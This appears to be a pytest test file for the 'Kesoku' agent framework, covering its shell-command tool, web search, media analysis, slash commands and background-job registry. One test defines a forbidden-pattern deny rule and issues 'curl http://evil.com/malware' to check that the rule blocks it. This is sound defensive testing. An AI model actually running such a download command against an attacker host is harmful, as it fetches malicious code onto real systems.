"""Unit tests for Kesoku agent tools and skill registry."""

import re
from unittest.mock import MagicMock

import pytest

from kesoku.agent.tools import ShellCommandError, ToolContext, WebSearchTool, run_shell_command


@pytest.mark.asyncio
async def test_web_search_tool_success() -> None:
    """Test WebSearchTool successfully executes search and formats grounding sources."""
    from unittest.mock import AsyncMock

    mock_client = MagicMock()
    mock_res = MagicMock()
    mock_res.text = "The weather in Tokyo is sunny."

    mock_candidate = MagicMock()
    mock_chunk1 = MagicMock()
    mock_chunk1.web.uri = "https://weather.com/tokyo"
    mock_chunk1.web.title = "Tokyo Weather"

    # Duplicate URI to test deduplication logic
    mock_chunk2 = MagicMock()
    mock_chunk2.web.uri = "https://weather.com/tokyo"
    mock_chunk2.web.title = "Tokyo Weather Update"

    mock_candidate.grounding_metadata.grounding_chunks = [mock_chunk1, mock_chunk2]
    mock_res.candidates = [mock_candidate]

    mock_client.aio.models.generate_content = AsyncMock(return_value=mock_res)

    # Explicitly inject mock client
    tool = WebSearchTool(client=mock_client)
    ctx = ToolContext(session_id="s1", session_workspace="workspace1")
    result = await tool.web_search("What is the weather in Tokyo?", ctx)

    assert "The weather in Tokyo is sunny." in result
    assert "Sources:" in result
    assert "- Tokyo Weather: https://weather.com/tokyo" in result
    # Verify that duplicate sources are successfully deduplicated
    assert result.count("https://weather.com/tokyo") == 1


@pytest.mark.asyncio
async def test_web_search_tool_api_failure() -> None:
    """Test WebSearchTool handles API call exceptions gracefully."""
    from unittest.mock import AsyncMock

    mock_client = MagicMock()
    mock_client.aio.models.generate_content = AsyncMock(side_effect=Exception("API Quota Exceeded"))

    tool = WebSearchTool(client=mock_client)
    result = await tool.web_search("Test query", None)

    assert "Web search failed: API Quota Exceeded" in result


@pytest.mark.asyncio
async def test_run_shell_command_default_cwd(tmp_path) -> None:
    """Test that run_shell_command defaults to executing inside the AWD."""
    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        # Set AWD
        cfg.agent_working_dir = str(tmp_path)

        ctx = ToolContext(session_id="test_sess", session_workspace="test_workspace")

        # Execute pwd command
        res = await run_shell_command("pwd", context=ctx)

        assert "=== STDOUT ===" in res
        # Output of pwd should match the AWD (tmp_path)
        assert str(tmp_path) in res
    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_run_shell_command_custom_cwd(tmp_path) -> None:
    """Test that run_shell_command executes in custom cwd if supplied."""
    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)

        # Create a subfolder to run command in
        subfolder = tmp_path / "subfolder"
        subfolder.mkdir()

        ctx = ToolContext(session_id="test_sess", session_workspace="test_workspace")

        # Execute pwd command inside custom cwd (relative)
        res = await run_shell_command("pwd", cwd="subfolder", context=ctx)
        assert "=== STDOUT ===" in res
        assert str(subfolder) in res

        # Execute pwd command inside custom cwd (absolute)
        another_folder = tmp_path / "another"
        another_folder.mkdir()
        res_abs = await run_shell_command("pwd", cwd=str(another_folder), context=ctx)
        assert str(another_folder) in res_abs
    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_run_shell_command_env_variables(tmp_path) -> None:
    """Test that run_shell_command injects AWD and STAGING_DIR environment variables."""
    import os

    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)

        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")

        # Execute command to print env variables
        res = await run_shell_command("echo $AWD && echo $STAGING_DIR", context=ctx)

        assert "=== STDOUT ===" in res
        assert str(tmp_path) in res
        expected_staging = os.path.realpath(os.path.join(cfg.workspace.sessions_dir, "test_ws"))
        assert expected_staging in res
    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_run_shell_command_failure(tmp_path) -> None:
    """Test that run_shell_command raises ShellCommandError on non-zero exit code."""
    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)

        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")

        with pytest.raises(ShellCommandError) as exc_info:
            await run_shell_command("echo 'error occurred' >&2 && exit 5", context=ctx)

        assert "Command failed with exit code 5" in str(exc_info.value)
        assert "error occurred" in str(exc_info.value)
    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_run_shell_command_background_transition(tmp_path) -> None:
    """Test that run_shell_command gracefully transitions to background execution on timeout."""
    import kesoku.config
    from kesoku.agent.tools import ActiveJobsRegistry, run_shell_command
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)
        # Set low threshold to trigger background transition
        cfg.shell.background_threshold_seconds = 0.1

        active_jobs = ActiveJobsRegistry()
        ctx = ToolContext(
            session_id="test_sess",
            session_workspace="test_ws",
            active_jobs=active_jobs,
        )

        res = await run_shell_command("sleep 5 && echo 'done'", context=ctx)

        assert "transitioned to background execution" in res
        assert "Background Job ID: `job_" in res
        assert "Stdout path:" in res
        assert "Stderr path:" in res

        # Avoid process leak by stopping running jobs
        await active_jobs.stop_all_for_session("test_sess")
    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_run_shell_command_start_failure(tmp_path) -> None:
    """Test that run_shell_command raises ShellCommandError on starting non-existent command."""
    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)
        # Disable shell mode to allow shlex splitting and triggering FileNotFoundError for non-existent executable
        cfg.shell.use_shell = False

        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")

        with pytest.raises(ShellCommandError) as exc_info:
            await run_shell_command("non_existent_command_xyz", context=ctx)

        assert "Error executing command" in str(exc_info.value)
    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_run_shell_command_failure_truncation(tmp_path) -> None:
    """Test that run_shell_command truncates extremely long failed outputs and saves to a file."""
    import os
    import re

    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)

        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")

        # Generate extremely long output (more than 30000 characters)
        long_cmd = "python3 -c 'print(\"a\" * 40000); exit(1)'"
        with pytest.raises(ShellCommandError) as exc_info:
            await run_shell_command(long_cmd, context=ctx)

        err_msg = str(exc_info.value)
        assert "Command failed with exit code 1" in err_msg
        assert "Output truncated" in err_msg
        assert "Full output saved to session workspace file:" in err_msg

        # Extract output file path from message to verify it was written
        match = re.search(r"Full output saved to session workspace file: `([^`]+)`", err_msg)
        assert match is not None
        filepath = match.group(1)
        assert os.path.exists(filepath)
        with open(filepath, encoding="utf-8") as f:
            content = f.read()
            assert "a" * 40000 in content
    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_run_shell_command_max_output_chars(tmp_path) -> None:
    """Test that run_shell_command truncates output to max_output_chars and appends help message."""
    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)

        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")

        # Test default (max_output_chars = 5000)
        cmd_6000 = "python3 -c 'print(\"a\" * 6000)'"
        res = await run_shell_command(cmd_6000, context=ctx)

        assert "Output truncated" in res
        assert "Preview (first ~45% and last ~55% of 5000 chars):" in res
        assert "read_file(" in res and "max_output_chars" in res

        # Middle-out preview keeps both the head (STDOUT header) and the tail (STDERR footer)
        preview_part = res.split("Preview (first ~45% and last ~55% of 5000 chars):\n")[1]
        assert preview_part.startswith("=== STDOUT ===")
        assert "=== STDERR ===" in preview_part
        assert "chars omitted from the middle" in preview_part
        assert len(preview_part) <= 5000

        # Test custom max_output_chars = 100
        res_custom = await run_shell_command(cmd_6000, max_output_chars=100, context=ctx)
        assert "Output truncated" in res_custom
        preview_part_custom = res_custom.split("Preview (first ~45% and last ~55% of 100 chars):\n")[1]
        assert preview_part_custom.startswith("=== STDOUT ===")
        assert "=== STDERR ===" in preview_part_custom
        assert len(preview_part_custom) <= 100

        # Test no truncation if content is shorter than max_output_chars
        cmd_50 = "python3 -c 'print(\"a\" * 50)'"
        res_short = await run_shell_command(cmd_50, max_output_chars=100, context=ctx)
        assert "Output truncated" not in res_short
        assert "a" * 50 in res_short

    finally:
        kesoku.config._global_config = original_config


@pytest.mark.asyncio
async def test_manual_compact_command(tmp_path) -> None:
    """Verify that manual chatbot /compact command triggers compaction eligibility check."""
    from kesoku.config import KesokuConfig, WorkspaceConfig
    from kesoku.context import KesokuContext
    from kesoku.db import DatabaseManager, Message
    from kesoku.gateway.chatbot.base import Chatbot
    from kesoku.gateway.gateway import Gateway

    temp_db = str(tmp_path / "test_tools_cmd.db")
    DatabaseManager(temp_db).init_tables()
    cfg = KesokuConfig(workspace=WorkspaceConfig(db_path=temp_db))
    gw = Gateway(context=KesokuContext(config=cfg))

    session = await gw.create_session(
        "sess_cmd_test",
        title="Command Session",
        chatbot_id="cli",
        channel_id="ch_cmd",
    )
    # Ingest user message to link session to channel
    await gw.post(
        Message(
            session_id="sess_cmd_test",
            chatbot_id="cli",
            channel_id="ch_cmd",
            sender="u1",
            role="user",
            content="Hello!",
            status="processed",
        )
    )

    # Mock a chatbot instance
    class DummyChatbot(Chatbot):
        async def handle_message(self, message: Message) -> None:
            pass

    bot = DummyChatbot("cli", gw)

    # Execute the manual compact command
    reply_msg = None

    async def mock_reply(content: str) -> None:
        nonlocal reply_msg
        reply_msg = content

    await bot.commands.execute("compact", mock_reply, "ch_cmd")

    assert "Nothing to compact" in reply_msg


@pytest.mark.asyncio
async def test_analyze_media_tool_success(tmp_path) -> None:
    """Test analyze_media tool successfully reads a file and invokes LLM analysis."""
    from unittest.mock import AsyncMock, patch

    from kesoku.agent.llm import LLMResponse
    from kesoku.agent.tools.media import analyze_media

    media_file = tmp_path / "test_image.png"
    media_file.write_bytes(b"\x89PNG\r\n\x1a\n")

    mock_llm = MagicMock()
    mock_llm.generate = AsyncMock(return_value=LLMResponse(content="An image of a cute cat."))

    mock_gateway = MagicMock()
    mock_gateway.context.get_llm.return_value = mock_llm

    ctx = ToolContext(
        session_id="sess_media",
        session_workspace="ws_media",
        gateway=mock_gateway,
    )

    with patch("kesoku.agent.tools.media.PathResolver.resolve", return_value=str(media_file)):
        res = await analyze_media(path="test_image.png", prompt="What is this image?", context=ctx)

    assert res == "An image of a cute cat."
    mock_llm.generate.assert_called_once()
    call_args = mock_llm.generate.call_args
    history_passed = call_args.kwargs["history"]
    assert len(history_passed) == 1
    assert history_passed[0].metadata["attachments"][0]["path"] == str(media_file)
    assert history_passed[0].metadata["attachments"][0]["mime_type"] == "image/png"


@pytest.mark.asyncio
async def test_analyze_media_tool_not_found() -> None:
    """Test analyze_media returns clear error when media file does not exist."""
    from kesoku.agent.tools.media import analyze_media

    ctx = ToolContext(session_id="s1", session_workspace="ws1")
    res = await analyze_media(path="non_existent_video.mp4", context=ctx)
    assert "does not exist" in res


@pytest.mark.asyncio
async def test_grep_slash_command(tmp_path) -> None:
    """Verify that chatbot /grep command triggers memory_search tool under the hood."""
    import time

    from kesoku.config import KesokuConfig, WorkspaceConfig
    from kesoku.constants import MessageRole, MessageStatus, MessageType
    from kesoku.context import KesokuContext
    from kesoku.db import DatabaseManager, Message, Session
    from kesoku.gateway.chatbot.base import Chatbot
    from kesoku.gateway.gateway import Gateway

    temp_db = str(tmp_path / "test_slash_grep.db")
    db_mgr = DatabaseManager(temp_db)
    db_mgr.init_tables()
    cfg = KesokuConfig(workspace=WorkspaceConfig(db_path=temp_db))
    ctx = KesokuContext(config=cfg, db=db_mgr)
    gw = Gateway(context=ctx)

    sess = Session(
        id="sess_slash",
        title="Slash Session",
        created_at=time.time(),
        updated_at=time.time(),
    )
    db_mgr.create_session(sess)
    db_mgr.set_channel_role("cli", "ch_slash", "default")
    db_mgr.set_active_session_for_channel("cli", "ch_slash", "sess_slash")

    # Save a message that matches
    msg = Message(
        id="m1",
        session_id="sess_slash",
        chatbot_id="cli",
        channel_id="ch_slash",
        sender="user",
        role=MessageRole.USER,
        type=MessageType.TEXT,
        content="Testing grep keyword match.",
        timestamp=time.time(),
        status=MessageStatus.PROCESSED,
    )
    db_mgr.save_message(msg)

    class DummyChatbot(Chatbot):
        async def handle_message(self, message: Message) -> None:
            pass

    bot = DummyChatbot("cli", gw)
    reply_msg = None

    async def mock_reply(content: str) -> None:
        nonlocal reply_msg
        reply_msg = content

    await bot.execute_command_from_text("/grep keyword", mock_reply, channel_id="ch_slash")

    assert reply_msg is not None
    assert "Search Results for 'keyword'" in reply_msg
    assert "Testing grep keyword match." in reply_msg


@pytest.mark.asyncio
async def test_run_shell_command_forbidden_patterns(tmp_path) -> None:
    """Test that run_shell_command blocks forbidden patterns with custom error messages."""
    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)

        # Configure forbidden patterns
        cfg.shell.forbidden_patterns = {
            r"ping": "Ping is not allowed for security reasons.",
            r"curl.*evil\.com": "Access to evil.com is blocked.",
        }

        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")

        # Test matching pattern 1
        res1 = await run_shell_command("ping 8.8.8.8", context=ctx)
        assert res1 == "Ping is not allowed for security reasons."

        # Test matching pattern 2
        res2 = await run_shell_command("curl http://evil.com/malware", context=ctx)
        assert res2 == "Access to evil.com is blocked."

        # Test non-matching pattern
        res3 = await run_shell_command("echo hello", context=ctx)
        assert "hello" in res3

    finally:
        kesoku.config._global_config = original_config


# --- agent.disabled_tools -------------------------------------------------------------------
from unittest.mock import patch  # noqa: E402

from kesoku.agent.tools.registry import ToolRegistry  # noqa: E402


def _registry_with_two_tools() -> ToolRegistry:
    reg = ToolRegistry()

    @reg.register
    def alpha(x: int) -> int:
        """Return x."""
        return x

    @reg.register
    def beta(x: int) -> int:
        """Return x."""
        return x

    return reg


def test_disabled_tools_hidden_from_schema_and_execution() -> None:
    reg = _registry_with_two_tools()
    cfg = MagicMock()
    cfg.agent.disabled_tools = ["beta"]
    with patch("kesoku.config.get_config", return_value=cfg):
        assert [f.__name__ for f in reg.get_tools_list()] == ["alpha"]
        assert reg.get_tool("alpha")(1) == 1
        try:
            reg.get_tool("beta")
        except KeyError as e:
            assert "disabled" in str(e)
        else:
            raise AssertionError("disabled tool must not be executable")


def test_disabled_tools_default_empty_keeps_everything() -> None:
    reg = _registry_with_two_tools()
    cfg = MagicMock()
    cfg.agent.disabled_tools = []
    with patch("kesoku.config.get_config", return_value=cfg):
        assert [f.__name__ for f in reg.get_tools_list()] == ["alpha", "beta"]


@pytest.mark.asyncio
async def test_run_shell_command_middle_out_keeps_head_marker(tmp_path) -> None:
    """A 20K output: a marker in the first 100 chars and one in the last 100 chars both survive; file is complete."""
    import kesoku.config
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)
        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")
        script = tmp_path / "gen.py"
        script.write_text(
            "print('HEAD_MARKER negotiated=lz4')\n"
            "for i in range(400):\n    print(f'packet {i:04d} ' + 'x' * 40)\n"
            "print('TAIL_MARKER dropped=37')\n"
        )
        res = await run_shell_command(f"python3 {script}", context=ctx)
        assert "HEAD_MARKER negotiated=lz4" in res
        assert "TAIL_MARKER dropped=37" in res
        saved = re.search(r"saved to session workspace file: `([^`]+)`", res)
        assert saved
        full = open(saved.group(1), encoding="utf-8").read()
        assert "packet 0200" in full and "HEAD_MARKER" in full and "TAIL_MARKER" in full
    finally:
        kesoku.config._global_config = original_config


# --- ActiveJobsRegistry bookkeeping for the running_jobs snapshot (P1-3) -------------------------------------------


class _FakeProc:
    """Minimal stand-in for asyncio.subprocess.Process (only `pid` is read at registration)."""

    def __init__(self, pid: int) -> None:
        self.pid = pid
        self.returncode: int | None = None


@pytest.mark.asyncio
async def test_registry_register_snapshot_fields() -> None:
    """register stores the truncated command, log paths, pid and pgid; snapshot is per session and ordered."""
    import os

    from kesoku.agent.state_snapshot import JOB_COMMAND_MAX_CHARS
    from kesoku.agent.tools import ActiveJobsRegistry

    reg = ActiveJobsRegistry()
    pid = os.getpid()
    long_cmd = "x" * 500
    await reg.register("job_a", "s1", _FakeProc(pid), "/s/a.stdout", command=long_cmd, stderr_filepath="/s/a.stderr")
    await reg.register("job_b", "s1", _FakeProc(pid), "/s/b.stdout")
    await reg.register("job_other", "s2", _FakeProc(pid), "/s/o.stdout", command="other")

    snap = await reg.snapshot("s1")
    assert [j.job_id for j in snap.running] == ["job_a", "job_b"]
    a = snap.running[0]
    assert a.command == long_cmd[:JOB_COMMAND_MAX_CHARS]
    assert a.stdout_path == "/s/a.stdout"
    assert a.stderr_path == "/s/a.stderr"
    assert a.pid == pid
    expected_pgid = os.getpgid(pid) if os.name == "posix" else pid
    assert a.pgid == expected_pgid
    assert a.started_at > 0
    assert snap.running[1].command == ""
    assert snap.running[1].stderr_path == ""
    assert snap.finished == []

    assert [j.job_id for j in (await reg.snapshot("s2")).running] == ["job_other"]
    assert (await reg.snapshot("nobody")).is_empty


@pytest.mark.asyncio
async def test_registry_pgid_falls_back_to_pid_for_dead_process() -> None:
    """When the process group cannot be resolved (process gone), pgid falls back to the pid."""
    from kesoku.agent.tools import ActiveJobsRegistry

    reg = ActiveJobsRegistry()
    # PIDs this large do not exist on Linux (pid_max <= 4194304), so getpgid raises ProcessLookupError.
    await reg.register("job_dead", "s1", _FakeProc(2**30), "/s/d.stdout")
    snap = await reg.snapshot("s1")
    assert snap.running[0].pgid == 2**30


@pytest.mark.asyncio
async def test_registry_unregister_records_finished_with_return_code() -> None:
    """unregister moves the job into the session's finished list with its return code; unknown ids are no-ops."""
    import os

    from kesoku.agent.tools import ActiveJobsRegistry

    reg = ActiveJobsRegistry()
    await reg.register("job_a", "s1", _FakeProc(os.getpid()), "/s/a.stdout", command="make test")
    await reg.unregister("job_a", return_code=2)
    await reg.unregister("job_a", return_code=0)  # already gone: ignored
    await reg.unregister("never_registered")

    snap = await reg.snapshot("s1")
    assert snap.running == []
    assert len(snap.finished) == 1
    fin = snap.finished[0]
    assert (fin.job_id, fin.command, fin.return_code, fin.reason) == ("job_a", "make test", 2, "exited")
    assert fin.finished_at > 0

    # Default return code is None.
    await reg.register("job_b", "s1", _FakeProc(os.getpid()), "/s/b.stdout")
    await reg.unregister("job_b")
    assert (await reg.snapshot("s1")).finished[-1].return_code is None


@pytest.mark.asyncio
async def test_registry_finished_deque_and_lru_bounds() -> None:
    """Finished jobs are capped per session (oldest dropped) and sessions are LRU-evicted beyond the cap."""
    import os

    from kesoku.agent.tools import ActiveJobsRegistry

    reg = ActiveJobsRegistry()
    pid = os.getpid()
    for i in range(ActiveJobsRegistry.FINISHED_PER_SESSION + 3):
        await reg.register(f"job_{i}", "s1", _FakeProc(pid), "/s/x")
        await reg.unregister(f"job_{i}", return_code=i)
    finished = (await reg.snapshot("s1")).finished
    assert len(finished) == ActiveJobsRegistry.FINISHED_PER_SESSION
    assert [f.return_code for f in finished] == list(range(3, ActiveJobsRegistry.FINISHED_PER_SESSION + 3))

    reg.MAX_FINISHED_SESSIONS = 3  # instance override keeps the test small
    for sid in ["s2", "s3", "s4"]:
        await reg.register(f"job_{sid}", sid, _FakeProc(pid), "/s/x")
        await reg.unregister(f"job_{sid}", return_code=0)
    # s1 was least recently updated and is evicted.
    assert (await reg.snapshot("s1")).finished == []
    # Updating s2 makes it most recent, so adding s5 evicts s3 instead.
    await reg.register("job_s2b", "s2", _FakeProc(pid), "/s/x")
    await reg.unregister("job_s2b", return_code=0)
    await reg.register("job_s5", "s5", _FakeProc(pid), "/s/x")
    await reg.unregister("job_s5", return_code=0)
    assert len((await reg.snapshot("s2")).finished) == 2
    assert (await reg.snapshot("s3")).finished == []
    assert len((await reg.snapshot("s4")).finished) == 1
    assert len((await reg.snapshot("s5")).finished) == 1


@pytest.mark.asyncio
async def test_registry_stop_all_for_session_terminates_group_and_drops_history() -> None:
    """stop_all_for_session kills the session's job process group and drops its finished history only."""
    import asyncio
    import os

    from kesoku.agent.tools import ActiveJobsRegistry

    reg = ActiveJobsRegistry()
    proc = await asyncio.create_subprocess_shell("sleep 30", preexec_fn=os.setsid if os.name == "posix" else None)
    try:
        await reg.register("job_run", "s1", proc, "/s/run.stdout", command="sleep 30")
        await reg.register("job_done", "s1", _FakeProc(os.getpid()), "/s/done.stdout")
        await reg.unregister("job_done", return_code=0)
        await reg.register("job_keep", "s2", _FakeProc(os.getpid()), "/s/keep.stdout")
        await reg.unregister("job_keep", return_code=0)

        snap = await reg.snapshot("s1")
        assert [j.job_id for j in snap.running] == ["job_run"]
        assert snap.running[0].pgid == (os.getpgid(proc.pid) if os.name == "posix" else proc.pid)
        assert len(snap.finished) == 1

        await reg.stop_all_for_session("s1")
        assert proc.returncode is not None
        assert (await reg.snapshot("s1")).is_empty
        assert len((await reg.snapshot("s2")).finished) == 1

        # The monitor's late unregister for a stopped job must not resurrect the session's history.
        await reg.unregister("job_run", return_code=proc.returncode)
        assert (await reg.snapshot("s1")).is_empty
    finally:
        if proc.returncode is None:
            proc.kill()
            await proc.wait()


@pytest.mark.asyncio
async def test_run_shell_command_background_job_bookkeeping(tmp_path) -> None:
    """A backgrounded command is registered with its command/stderr path and recorded with its exit code."""
    import asyncio
    from unittest.mock import AsyncMock

    import kesoku.config
    from kesoku.agent.tools import ActiveJobsRegistry
    from kesoku.config import init_config, load_config

    original_config = kesoku.config._global_config
    try:
        config_path = tmp_path / "config.toml"
        init_config(str(config_path))
        cfg = load_config(str(config_path))
        cfg.agent_working_dir = str(tmp_path)
        cfg.shell.background_threshold_seconds = 0.1

        active_jobs = ActiveJobsRegistry()
        gateway = MagicMock()
        gateway.post = AsyncMock()
        ctx = ToolContext(session_id="bg_sess", session_workspace="bg_ws", active_jobs=active_jobs, gateway=gateway)

        res = await run_shell_command("sleep 0.5; exit 3", context=ctx)
        assert "transitioned to background execution" in res
        snap = await active_jobs.snapshot("bg_sess")
        assert len(snap.running) == 1
        job = snap.running[0]
        assert job.command == "sleep 0.5; exit 3"
        assert job.stdout_path.endswith(f"background_{job.job_id}.stdout")
        assert job.stderr_path.endswith(f"background_{job.job_id}.stderr")

        # Wait for the monitor task to finish and unregister the job.
        for _ in range(100):
            snap = await active_jobs.snapshot("bg_sess")
            if snap.finished:
                break
            await asyncio.sleep(0.05)
        assert snap.running == []
        assert [(f.job_id, f.return_code) for f in snap.finished] == [(job.job_id, 3)]
        gateway.post.assert_awaited_once()
    finally:
        await active_jobs.stop_all_for_session("bg_sess")
        kesoku.config._global_config = original_config
